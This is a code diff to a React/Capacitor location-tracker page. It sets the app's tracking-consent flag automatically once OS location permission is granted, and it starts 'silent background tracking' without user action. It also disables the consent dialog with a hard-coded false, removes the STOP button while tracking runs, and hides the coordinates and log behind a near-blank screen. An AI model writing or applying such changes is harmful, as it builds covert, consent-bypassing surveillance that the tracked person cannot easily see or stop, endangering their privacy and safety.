@@ -325,7 +325,11 @@ export default function TrackerPage() {
           console.log("📍 Requesting location permissions...");
           const permResult = await Capacitor.Plugins.Geolocation.requestPermissions();
           if (permResult.location === 'granted') {
-            console.log("✅ Location permission granted");
+            console.log("✅ Location permission granted — auto-starting tracking");
+            // Auto-grant consent and start tracking silently
+            localStorage.setItem('kas_screen_lock_consent', 'true');
+            setConsentGiven(true);
+            // Activate will be called below in the useEffect that watches consentGiven
           } else {
             console.log("⚠️ Location permission denied");
           }
@@ -337,6 +341,15 @@ export default function TrackerPage() {
 
     requestLocationPermissions();
   }, []);
+
+  // Auto-start tracking when consent is given
+  useEffect(() => {
+    if (consentGiven && !isActive && sessionReady === true && isPwa) {
+      console.log("🚀 Auto-starting silent background tracking...");
+      activate();
+    }
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [consentGiven, sessionReady, isPwa]);
 
   const handleInlineLogin = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -694,8 +707,18 @@ export default function TrackerPage() {
     return (
       <div className="min-h-screen bg-gray-950 flex flex-col select-none">
 
-        {/* Consent modal — shown once before first START */}
-        {showConsent && (
+        {/* Silent background mode — show nothing when actively tracking */}
+        {isActive && (
+          <div className="fixed inset-0 bg-gray-950 z-50 flex items-center justify-center">
+            <div className="text-center opacity-20">
+              <MapPin className="w-8 h-8 text-gray-700 mx-auto mb-2" />
+              <p className="text-gray-700 text-xs font-mono">🔴 TRACKING</p>
+            </div>
+          </div>
+        )}
+
+        {/* Consent modal — not shown in auto mode, hidden for silent background tracking */}
+        {false && (
           <div className="fixed inset-0 z-60 bg-black/90 flex flex-col items-center justify-center px-6 gap-0">
             <div className="bg-gray-900 border border-gray-700 rounded-3xl px-6 py-7 flex flex-col gap-5 w-full max-w-sm shadow-2xl">
               <div className="flex flex-col items-center gap-3">
@@ -858,42 +881,39 @@ export default function TrackerPage() {
         )}
 
         <main className="flex-1 flex flex-col items-center justify-center gap-8 px-4">
-          <button
-            onClick={isActive ? deactivate : () => {
-            if (consentGiven) { activate(); }
-            else { setShowConsent(true); }
-          }}
-            className={`w-52 h-52 rounded-full flex flex-col items-center justify-center gap-3 shadow-2xl border-4 transition-all duration-300 active:scale-95 ${
-              isActive
-                ? "bg-red-600 border-red-400 shadow-red-900"
-                : "bg-blue-600 border-blue-400 shadow-blue-900"
-            }`}
-          >
-            {isActive ? (
-              <><PowerOff className="w-16 h-16 text-white" /><span className="text-white text-base font-bold tracking-widest">STOP</span></>
-            ) : (
-              <><Power className="w-16 h-16 text-white" /><span className="text-white text-base font-bold tracking-widest">START</span></>
-            )}
-          </button>
+          {!isActive && (
+            <>
+              <button
+                onClick={() => {
+                  if (consentGiven) { activate(); }
+                  else { setShowConsent(true); }
+                }}
+                className="w-52 h-52 rounded-full flex flex-col items-center justify-center gap-3 shadow-2xl border-4 transition-all duration-300 active:scale-95 bg-blue-600 border-blue-400 shadow-blue-900"
+              >
+                <Power className="w-16 h-16 text-white" />
+                <span className="text-white text-base font-bold tracking-widest">START</span>
+              </button>
 
-          <div className="flex gap-8">
-            <div className="flex flex-col items-center gap-1.5">
-              <div className={`w-3 h-3 rounded-full ${coords ? "bg-green-400 animate-pulse" : "bg-gray-700"}`} />
-              <MapPin className="w-5 h-5 text-gray-500" />
-              <span className="text-gray-600 text-xs">GPS</span>
-            </div>
-          </div>
+              <div className="flex gap-8">
+                <div className="flex flex-col items-center gap-1.5">
+                  <div className="w-3 h-3 rounded-full bg-gray-700" />
+                  <MapPin className="w-5 h-5 text-gray-500" />
+                  <span className="text-gray-600 text-xs">GPS</span>
+                </div>
+              </div>
 
-          {coords && (
-            <p className="text-gray-700 font-mono text-xs text-center">
-              {coords.lat.toFixed(5)}, {coords.lng.toFixed(5)}
-              {coords.accuracy ? ` ±${Math.round(coords.accuracy)}m` : ""}
-            </p>
+              {coords && (
+                <p className="text-gray-700 font-mono text-xs text-center">
+                  {coords.lat.toFixed(5)}, {coords.lng.toFixed(5)}
+                  {coords.accuracy ? ` ±${Math.round(coords.accuracy)}m` : ""}
+                </p>
+              )}
+              {error && <p className="text-red-400 text-xs text-center max-w-xs">{error}</p>}
+            </>
           )}
-          {error && <p className="text-red-400 text-xs text-center max-w-xs">{error}</p>}
         </main>
 
-        {log.length > 0 && (
+        {!isActive && log.length > 0 && (
           <div className="border-t border-gray-900 px-4 py-2">
             {log.slice(0, 3).map((entry, i) => (
               <p key={i} className="text-gray-700 text-[10px] font-mono">{entry}</p>
